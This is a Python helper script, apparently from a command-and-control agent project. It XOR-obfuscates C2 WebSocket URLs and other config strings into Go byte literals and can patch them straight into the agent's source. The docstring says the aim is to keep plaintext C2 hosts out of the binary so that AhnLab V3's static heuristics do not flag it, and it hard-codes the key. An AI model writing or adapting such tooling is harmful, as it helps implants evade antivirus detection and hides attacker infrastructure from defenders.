#!/usr/bin/env python3
"""Emit xor.go-style XOR byte literals for agent configuration strings.

The agent XOR-obfuscates baked config with the key in agent/xor.go so the
compiled binary carries no plaintext C2 URLs / hosts (AhnLab V3 static
heuristics key on plaintext `wss://...` strings).

Usage:
  python3 scripts/xor_encode.py "wss://cdn.example.com/agent"
      ->  eWssURL = []byte("\x..\x..")

  python3 scripts/xor_encode.py "wss://a.com/agent" --var eWssURL2 --patch agent/xor.go
      -> rewrites the variable in the file in place (template tree)

Verify an existing literal from xor.go:
  python3 scripts/xor_encode.py --decode '\x58\x04\x47...'
"""
import argparse
import re
import sys

KEY = b"5159a8c24cb79e045e049989df2e5028"


def xor_encode(s: str) -> bytes:
    raw = s.encode("utf-8")
    return bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(raw)])


def go_literal(enc: bytes) -> str:
    return '[]byte("' + "".join(f"\\x{b:02x}" for b in enc) + '")'


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("value", nargs="?", help="plaintext to encode")
    ap.add_argument("--var", default="eWssURL", help="Go variable name")
    ap.add_argument("--patch", help="patch this Go file's var in place")
    ap.add_argument("--decode", help="decode a \\x.. literal back to plaintext")
    args = ap.parse_args()

    if args.decode:
        raw = args.decode.encode("utf-8").decode("unicode_escape").encode("latin-1")
        print(bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(raw)]).decode("utf-8", "replace"))
        return 0

    if not args.value:
        ap.error("value required (or use --decode)")

    lit = go_literal(xor_encode(args.value))
    print(f"{args.var} = {lit}")
    print(f'# decodes to: "{args.value}"')

    if args.patch:
        with open(args.patch, "r", encoding="utf-8") as f:
            src = f.read()
        pattern = re.compile(rf"({re.escape(args.var)}\s*=\s*)\[\]byte\(\"[^\"]*\"\)")
        if not pattern.search(src):
            print(f"ERROR: {args.var} not found in {args.patch}", file=sys.stderr)
            return 1
        src = pattern.sub(lambda m: m.group(1) + lit, src, count=1)
        with open(args.patch, "w", encoding="utf-8") as f:
            f.write(src)
        print(f"patched {args.var} in {args.patch}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
